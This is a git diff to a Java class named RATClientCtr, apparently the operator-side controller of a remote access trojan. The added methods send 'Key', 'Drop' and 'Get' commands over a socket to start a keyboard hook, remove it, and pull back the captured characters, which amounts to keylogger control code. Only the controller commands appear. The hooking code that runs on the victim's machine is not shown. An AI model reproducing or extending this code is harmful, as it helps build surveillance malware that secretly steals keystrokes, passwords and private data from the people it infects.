@@ -57,20 +57,6 @@ public class RATClientCtr {
         }
     }
     
-    public static void getKey(ArrayList<Character> key) throws IOException {
-        InputStream ips = mySocket.getInputStream();
-        DataInputStream dis = new DataInputStream(ips);
-        String input = dis.readUTF();
-        //ArrayList<String> data = new ArrayList<String>();
-        //String[] data = null;
-        
-        int numline = dis.readInt();
-        
-        for (int i = 0; i < numline; i++){
-            key.add((char)dis.readInt());
-        }
-    }
-    
     public static void closeConn() {
         try {
             mySocket.close();
@@ -148,6 +134,46 @@ public class RATClientCtr {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+    
+    public static void getKey(ArrayList<Character> key) throws IOException {
+        String command = "Get";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
+        try {
+            InputStream ips = mySocket.getInputStream();
+            DataInputStream dis = new DataInputStream(ips);
+            String input = dis.readUTF();
+            //ArrayList<String> data = new ArrayList<String>();
+            //String[] data = null;
+
+            int numline = dis.readInt();
+            System.out.println(numline);
+
+            for (int i = 0; i < numline; i++){
+                key.add((char)dis.readInt());
+            }
+        }catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public static void keyHook() throws IOException {
+        String command = "Key";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
+    }
+    
+    public static void unHook() throws IOException {
+        String command = "Drop";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
     }
 
 }
